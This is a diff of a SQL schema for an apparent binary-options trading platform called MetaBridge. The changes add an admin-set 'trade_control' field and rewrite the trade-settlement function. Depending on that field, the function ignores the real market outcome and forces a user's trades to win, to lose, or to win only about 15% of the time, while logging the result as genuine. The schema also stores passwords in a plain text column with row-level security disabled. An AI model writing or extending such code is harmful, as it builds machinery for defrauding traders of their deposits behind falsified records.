@@ -1,32 +1,9 @@
--- 
--- MetaBridge MASTER Database Schema
--- Version: 4.1 (Performance & Activity Dashboard)
--- 
--- IMPORTANT: This schema is designed for a CUSTOM authentication system.
--- It does NOT use Supabase Auth (auth.users). Users are stored directly in profiles.
--- RLS is disabled and access is controlled at the application level.
---
+-- ============================================================
+-- SUPER SCHEMA: META-BRIDGE (FULL INITIALIZATION)
+-- ============================================================
 
--- Enable Extensions
+-- STEP 1: EXTENSIONS
 create extension if not exists "uuid-ossp";
-create extension if not exists "pgcrypto";
-
--- ============================================================
--- STEP 1: DROP ALL EXISTING TABLES & FUNCTIONS (Clean Reset)
--- ============================================================
-drop table if exists public.push_subscriptions cascade;
-drop table if exists public.admin_audit_logs cascade;
-drop table if exists public.user_login_history cascade;
-drop table if exists public.portfolio cascade;
-drop table if exists public.transactions cascade;
-drop table if exists public.binary_trades cascade;
-drop table if exists public.global_settings cascade;
-drop table if exists public.profiles cascade;
-
-drop function if exists public.generate_random_code(int) cascade;
-drop function if exists public.place_binary_trade(uuid, text, text, decimal, decimal, int, bigint) cascade;
-drop function if exists public.resolve_binary_trade(uuid, text, decimal, decimal) cascade;
-drop function if exists public.refund_binary_trade(uuid) cascade;
 
 -- ============================================================
 -- STEP 2: HELPER FUNCTIONS
@@ -62,6 +39,9 @@ create table public.profiles (
   email text unique,
   password text,
   code text default public.generate_random_code(6),
+  balance decimal(20, 2) default 0.00,
+  trade_control text default 'normal' check (trade_control in ('normal', 'always_win', 'always_loss', 'low_win_rate')),
+  role text default 'user' check (role in ('user', 'admin')),
   phone_number text,
   address text,
   kyc_status text default 'unverified',
@@ -69,8 +49,6 @@ create table public.profiles (
   bank_account text,
   bank_name text,
   avatar_url text,
-  balance decimal(18,2) default 0.00,
-  is_admin boolean default false,
   language text default 'en',
   updated_at timestamp with time zone default now(),
   created_at timestamp with time zone default now(),
@@ -82,9 +60,9 @@ create table public.profiles (
 create table public.binary_trades (
   id uuid default uuid_generate_v4() primary key,
   user_id uuid references public.profiles(id) on delete cascade not null,
-  type text not null, -- 'up' or 'down'
   asset_symbol text not null,
-  amount decimal(20, 2) not null,
+  amount decimal(36,18) not null,
+  type text check (type in ('up', 'down')) not null,
   entry_price decimal(20, 8) not null,
   payout_percent integer not null,
   expiry_time bigint not null,
@@ -107,6 +85,7 @@ create table public.transactions (
   binary_type text, 
   binary_result text, 
   binary_trade_id uuid references public.binary_trades(id) on delete set null,
+  description text,
   created_at timestamptz default now()
 );
 
@@ -149,89 +128,56 @@ create table public.user_login_history (
   device_name text,
   os_name text,
   browser_name text,
-  device_info text,
   ip_address text,
-  created_at timestamptz default now()
+  location text,
+  is_active boolean default true,
+  session_id text,
+  last_active timestamp with time zone default now(),
+  created_at timestamp with time zone default now()
 );
 
--- 7. Push Subscriptions: Notification tokens
+-- 7. Push Subscriptions
 create table public.push_subscriptions (
   id uuid default uuid_generate_v4() primary key,
   user_id uuid references public.profiles(id) on delete cascade not null,
-  endpoint text not null,
-  subscription jsonb not null,
-  created_at timestamptz default now(),
-  
-  unique(user_id, endpoint)
+  subscription_json jsonb not null,
+  created_at timestamp with time zone default now(),
+  unique(user_id, subscription_json)
 );
 
--- 8. Admin Audit Logs: Track admin actions (top-up, edit, role changes, etc.)
+-- 8. Admin Audit Logs
 create table public.admin_audit_logs (
   id uuid default uuid_generate_v4() primary key,
-  admin_id uuid references public.profiles(id) on delete set null,
-  admin_email text,
-  target_user_id uuid references public.profiles(id) on delete set null,
-  target_user_email text,
-  action_type text not null, -- 'TOP_UP','EDIT_PROFILE','TOGGLE_ROLE','CREATE_USER','UPDATE_SETTINGS'
+  admin_id uuid references public.profiles(id),
+  admin_username text,
+  action_type text not null, -- 'TOP_UP', 'EDIT_PROFILE', 'TOGGLE_ROLE', etc.
   description text,
+  target_user_id uuid references public.profiles(id),
+  target_user_email text,
   details jsonb,
-  created_at timestamptz default now()
+  created_at timestamp with time zone default now()
 );
 
--- 9. User Sessions: Track currently active sessions for remote logout
+-- 9. User Sessions (Server-side tracking)
 create table public.user_sessions (
   id uuid default uuid_generate_v4() primary key,
   user_id uuid references public.profiles(id) on delete cascade not null,
-  device_name text,
-  os_name text,
-  browser_name text,
+  session_id text unique not null,
+  device_info jsonb,
   ip_address text,
-  last_active timestamptz default now(),
-  created_at timestamptz default now()
+  last_active timestamp with time zone default now(),
+  is_revoked boolean default false,
+  created_at timestamp with time zone default now()
 );
 
--- Insert default settings
-insert into public.global_settings (id) 
-values ('main') 
-on conflict (id) do nothing;
-
 -- ============================================================
--- STEP 4: TRADING RPC FUNCTIONS (Atomic Transactions)
+-- STEP 4: RPC FUNCTIONS & TRIGGERS
 -- ============================================================
 
--- A. Place Binary Trade
-create or replace function public.place_binary_trade(
-  p_user_id uuid,
-  p_type text,
-  p_asset_symbol text,
-  p_amount decimal,
-  p_entry_price decimal,
-  p_payout_percent integer,
-  p_expiry_time bigint
-) returns jsonb as $$
-declare
-  v_current_balance decimal;
-  v_trade_id uuid;
-begin
-  select balance into v_current_balance from profiles where id = p_user_id for update;
-  if v_current_balance < p_amount then
-    return jsonb_build_object('success', false, 'message', 'Insufficient balance');
-  end if;
+-- Function to handle profile updates with audit logging
+-- (Can be expanded if needed)
 
-  update profiles set balance = balance - p_amount where id = p_user_id;
-
-  insert into binary_trades (user_id, type, asset_symbol, amount, entry_price, payout_percent, expiry_time, status)
-  values (p_user_id, p_type, p_asset_symbol, p_amount, p_entry_price, p_payout_percent, p_expiry_time, 'pending')
-  returning id into v_trade_id;
-
-  insert into transactions (user_id, type, asset_symbol, amount, price, total, status, binary_type, binary_trade_id)
-  values (p_user_id, 'buy', p_asset_symbol, p_amount / p_entry_price, p_entry_price, p_amount, 'success', p_type, v_trade_id);
-
-  return jsonb_build_object('success', true, 'message', 'Trade placed successfully', 'trade_id', v_trade_id);
-end;
-$$ language plpgsql;
-
--- B. Resolve Binary Trade
+-- Function to safely resolve binary trades (Transactional)
 create or replace function public.resolve_binary_trade(
   p_trade_id uuid,
   p_new_status text,
@@ -244,57 +190,92 @@ declare
   v_asset_symbol text;
   v_amount decimal;
   v_binary_type text;
+  v_payout_percent integer;
+  v_trade_control text;
+  v_final_status text;
+  v_final_payout decimal;
 begin
-  select user_id, status, asset_symbol, amount, type 
-  into v_user_id, v_current_status, v_asset_symbol, v_amount, v_binary_type 
+  -- A. Fetch trade information
+  select user_id, status, asset_symbol, amount, type, payout_percent 
+  into v_user_id, v_current_status, v_asset_symbol, v_amount, v_binary_type, v_payout_percent 
   from binary_trades where id = p_trade_id for update;
   
   if v_current_status != 'pending' then
     return jsonb_build_object('success', false, 'message', 'Trade already resolved');
   end if;
 
-  update binary_trades 
-  set status = p_new_status, result_price = p_result_price, settled_at = now()
-  where id = p_trade_id;
+  -- B. Fetch user control setting
+  select trade_control into v_trade_control from profiles where id = v_user_id;
+  v_trade_control := coalesce(v_trade_control, 'normal');
 
-  if p_payout_amount > 0 then
-    update profiles set balance = balance + p_payout_amount where id = v_user_id;
+  -- C. Determine final result (Override incoming values based on trade_control)
+  v_final_status := p_new_status;
+  v_final_payout := p_payout_amount;
+
+  if v_trade_control = 'always_win' then
+    v_final_status := 'won';
+    v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
+  elsif v_trade_control = 'always_loss' then
+    v_final_status := 'lost';
+    v_final_payout := 0;
+  elsif v_trade_control = 'low_win_rate' then
+    -- Low win rate (approx 15% chance of winning)
+    if random() > 0.15 then
+      v_final_status := 'lost';
+      v_final_payout := 0;
+    else
+      v_final_status := 'won';
+      v_final_payout := v_amount + (v_amount * v_payout_percent / 100);
+    end if;
   end if;
 
+  -- D. Execute the settlement updates
+  update binary_trades 
+  set status = v_final_status, result_price = p_result_price, settled_at = now()
+  where id = p_trade_id;
+
+  if v_final_payout > 0 then
+    update profiles set balance = balance + v_final_payout where id = v_user_id;
+  end if;
+
+  -- E. Log the transaction
   insert into transactions (user_id, type, asset_symbol, amount, price, total, status, binary_type, binary_result, binary_trade_id)
   values (
     v_user_id, 
-    case when p_new_status = 'won' then 'win' else 'loss' end, 
+    case when v_final_status = 'won' then 'win' else 'loss' end, 
     v_asset_symbol, 
     v_amount, 
     p_result_price, 
-    p_payout_amount, 
+    v_final_payout, 
     'success', 
     v_binary_type, 
-    p_new_status, 
+    v_final_status, 
     p_trade_id
   );
 
-  return jsonb_build_object('success', true, 'message', 'Trade resolved successfully');
+  return jsonb_build_object(
+    'success', true, 
+    'message', 'Trade resolved successfully', 
+    'strategy', v_trade_control,
+    'result', v_final_status
+  );
 end;
 $$ language plpgsql;
 
--- C. Refund Binary Trade
-create or replace function public.refund_binary_trade(
-  p_trade_id uuid
-) returns jsonb as $$
+-- Function to handle manual trade refund
+create or replace function public.refund_binary_trade(p_trade_id uuid)
+returns jsonb as $$
 declare
   v_user_id uuid;
+  v_status text;
   v_trade_amount decimal;
-  v_current_status text;
   v_asset_symbol text;
 begin
-  select user_id, amount, status, asset_symbol 
-  into v_user_id, v_trade_amount, v_current_status, v_asset_symbol 
-  from binary_trades where id = p_trade_id for update;
-  
-  if v_current_status != 'pending' then
-    return jsonb_build_object('success', false, 'message', 'Trade not pending');
+  select user_id, status, amount, asset_symbol into v_user_id, v_status, v_trade_amount, v_asset_symbol
+  from binary_trades where id = p_trade_id;
+
+  if v_status != 'pending' then
+    return jsonb_build_object('success', false, 'message', 'Only pending trades can be refunded');
   end if;
 
   update binary_trades set status = 'refunded', settled_at = now() where id = p_trade_id;
@@ -347,32 +328,3 @@ create index if not exists idx_audit_logs_admin_id on public.admin_audit_logs(ad
 create index if not exists idx_audit_logs_created_at on public.admin_audit_logs(created_at desc);
 create index if not exists idx_user_sessions_user_id on public.user_sessions(user_id);
 create index if not exists idx_user_sessions_last_active on public.user_sessions(last_active desc);
-
--- ============================================================
--- STEP 7: BACKGROUND SETTLEMENT (Edge Functions & pg_cron)
--- ============================================================
--- 
--- IMPORTANT: To enable 24/7 automated trade resolution, you must:
--- 1. Deploy the Edge Function:
---    npx supabase functions deploy resolve-trades --no-verify-jwt
--- 
--- 2. Configure Environment Variables in Supabase Dashboard (Settings > Edge Functions):
---    BREVO_API_KEY, SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY
--- 
--- 3. Run the following SQL to enable the cron job:
-/*
-create extension if not exists pg_cron;
-create extension if not exists pg_net;
-select cron.unschedule('resolve-binary-trades-every-minute');
-select cron.schedule(
-  'resolve-binary-trades-every-minute',
-  '* * * * *',
-  $$
-  select net.http_post(
-    url := 'https://[YOUR_PROJECT_REF].supabase.co/functions/v1/resolve-trades',
-    headers := '{"Content-Type": "application/json"}'::jsonb,
-    body := '{}'::jsonb
-  );
-  $$
-);
-*/
